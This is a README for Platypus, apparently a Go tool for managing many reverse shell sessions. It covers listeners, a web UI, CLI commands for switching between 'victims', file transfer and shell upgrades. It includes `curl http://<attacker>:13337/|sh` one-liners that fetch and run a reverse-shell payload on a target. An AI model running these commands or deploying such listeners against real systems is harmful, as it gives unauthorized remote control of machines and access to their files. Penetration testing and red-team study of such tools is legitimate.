## Platypus <https://github.com/WangYihang/Platypus>
<!--auto_detail_badge_begin_0b490ffb61b26b45de3ea5d7dd8a582e-->
![Language](https://img.shields.io/badge/Language-Golang-blue)
![Author](https://img.shields.io/badge/Author-WangYihang-orange)
![GitHub stars](https://img.shields.io/github/stars/WangYihang/Platypus.svg?style=flat&logo=github)
![Version](https://img.shields.io/badge/Version-V1.5.0-red)
![Time](https://img.shields.io/badge/Join-20210702-green)
<!--auto_detail_badge_end_fef74f2d7ea73fcc43ff78e05b1e7451-->


A modern multiple reverse shell sessions/clients manager via terminal written in go

## Features

- [x] Multiple service listening port
- [x] Multiple client connections
- [x] [RESTful API](./doc/RESTful.md)
- [x] [Python SDK](https://github.com/WangYihang/Platypus-Python)
- [x] [Reverse shell as a service](/doc/RaaS.md) (Pop a reverse shell in multiple languages without remembering idle commands)
- [x] Download/Upload file with progress bar
- [x] Full interactive shell
  - [x] Using vim gracefully in reverse shell
  - [x] Using CTRL+C and CTRL+Z in reverse shell
- [x] Start servers automatically
- [x] Port forwarding
- [x] Initialize from configuration file
- [x] Web UI

## Documents

* [Chinese | 中文文档](https://platypus-reverse-shell.vercel.app/)

## Get Start

> There are multiple ways to run this tool, feel free to choose one of the following method.

### Install requirements for running (Optional)

```
sudo apt install upx
```

### Run Platypus from source code

```bash
git clone https://github.com/WangYihang/Platypus
cd Platypus
sudo apt install -y make curl
make install_dependency
make release
```

### Run Platypus from docker-compose

```bash
docker-compose up -d
# Method 1: enter the cli of platypus
docker-compose exec app tmux a -t platypus
# Method 2: enter the web ui of platypus
firefox http://127.0.0.1:7331/
```

### Run Platypus from release binaries

1. Download `Platypus` prebuild binary from [HERE](https://github.com/WangYihang/Platypus/releases)
2. Run the downloaded executable file

## Usage

### Network Topology

* Attack IP: `192.168.88.129`
  * Reverse Shell Service: `0.0.0.0:13337`
  * Reverse Shell Service: `0.0.0.0:13338`
  * RESTful Service: `127.0.0.1:7331`
* Victim IP: `192.168.88.130`

### Give it a try

First, run `./Platypus`, then the `config.yml` will be generated automatically, and the config file is simple enough.

```yaml
servers: 
  - host: "0.0.0.0"
    port: 13337
    # Platypus is able to use several properties as unique identifier (primirary key) of a single client.
    # All available properties are listed below:
    # `%i` IP
    # `%u` Username
    # `%m` MAC address
    # `%o` Operating System
    # `%t` Income TimeStamp
    hashFormat: "%i %u %m %o"
  - host: "0.0.0.0"
    port: 13338
    # Using TimeStamp allows us to track all connections from the same IP / Username / OS and MAC.
    hashFormat: "%i %u %m %o %t"
restful:
  host: "127.0.0.1"
  port: 7331
  enable: true
# Check new releases from GitHub when starting Platypus
update: false
```

![](https://github.com/WangYihang/Platypus/raw/master/docs/zh/docs/images/cli/start.gif)

As you can see, platypus will check for updates, then start listening on port 13337, 13338 and 7331

The three port have different aims.
- 13337 Reverse shell server, which **disallows** the reverse session comes from the IP.
- 13338 Reverse shell server, which **allows** the reverse session comes from the IP.
- 7331 Platypus [RESTful](https://github.com/WangYihang/Platypus/blob/master/doc/RESTful.md) API EndPoint, which allows you to manipulate Platypus through HTTP protocol or [Python SDK](https://github.com/WangYihang/Platypus/blob/master/doc/SDK.md).

If you want another reverse shell listening port, just type `Run 0.0.0.0 1339` or modify the `config.yml`.

Also, platypus will print help information about [RaaS](https://github.com/WangYihang/Platypus/blob/master/doc/RaaS.md) which release you from remembering  tedious reverse shell commands. 

With platypus, all you have to do is just copy-and-paste the `curl` command and execute it on the victim machine.

```bash
curl http://127.0.0.1:13337/|sh
curl http://192.168.88.129:13337/|sh
```

Now, suppose that the victim is attacked by the attacker and a reverse shell command will be executed on the machine of victim.

![](https://github.com/WangYihang/Platypus/raw/master/docs/zh/docs/images/cli/connect.gif)

> Notice, the RaaS feature ensure that the reverse shell process is running in background and ignore the hangup signal.

## Get start with Web UI

### Manage listening port

![](https://github.com/WangYihang/Platypus/raw/master/docs/zh/docs/images/webui/add.gif)

### Wait for client connection

![](https://github.com/WangYihang/Platypus/raw/master/docs/zh/docs/images/webui/wait)

### Popup an interactive shell

![](https://github.com/WangYihang/Platypus/raw/master/docs/zh/docs/images/webui/shell.gif)

### Upgrade a reverse shell to an encrypted channel (Termite)

![](https://github.com/WangYihang/Platypus/raw/master/docs/zh/docs/images/webui/upgrade.gif)

## Get start with cli

### List all victims

You can use `List` command to print table style infomation about all listening servers and connected clients. Notice that the port `13337` will reset the connection from the same machine (we consider two connection are same iff they share the same Hash value, the info being hash can be configured in `config.yml`). Port `13338` will not reset such connections, which provide more repliability.

![](https://github.com/WangYihang/Platypus/raw/master/docs/zh/docs/images/cli/list.gif)

### Select a victim

`Jump` command can take you a tour between clients.
Use `Jump [HASH / Alias]` to jump. `Alias` is a alias of a specific client, you can set a alias of a client via `Alias [ALIAS]`.
Also, for jumping through `HASH`, you do not need to type the whole hash, just prefix of hash will work.

> All commands are case insensitive, feel free to use tab for completing.

![](https://github.com/WangYihang/Platypus/raw/master/docs/zh/docs/images/cli/jump.gif)


### Interactive shell

`Interact` will popup a shell, just like `netcat`.

![](https://github.com/WangYihang/Platypus/raw/master/docs/zh/docs/images/cli/interact.gif)

### Download file

Use `Download` command to download file from reverse shell client to attacker's machine.

![](https://github.com/WangYihang/Platypus/raw/master/docs/zh/docs/images/cli/download.gif)

### Upload file

Use `Upload` command to upload file to the current interacting client.

![](https://github.com/WangYihang/Platypus/raw/master/docs/zh/docs/images/cli/upload.gif)

### Interactive shell mode

> This feature only works on *nix clients

> For your user experience, we highly RECOMMEND you use `Upgrade` command to upgrade the plain reverse shell to a encrypted interactive shell.

Try to Spawn `/bin/bash` via Python, then the shell is fully interactive (You can use vim / htop and other stuffs).
First use `Jump` to select a client, then type `PTY`, then type `Interact` to drop into a fully interactive shell.
~~You can just simply type `exit` to exit pty mode~~, to avoid the situation in [issue #39](https://github.com/WangYihang/Platypus/issues/39), you can use `platyquit` to quit the fully interactive shell mode.

![](https://github.com/WangYihang/Platypus/raw/master/docs/zh/docs/images/cli/interactive.gif)


## Advanced [Usages](https://github.com/WangYihang/Platypus/blob/master/doc)

* Reverse shell as a Service (RaaS)
* RESTful API
* Python SDK

<!--auto_detail_active_begin_e1c6fb434b6f0baf6912c7a1934f772b-->
## 项目相关


## 最近更新

<!--auto_detail_active_end_f9cf7911015e9913b7e691a7a5878527-->
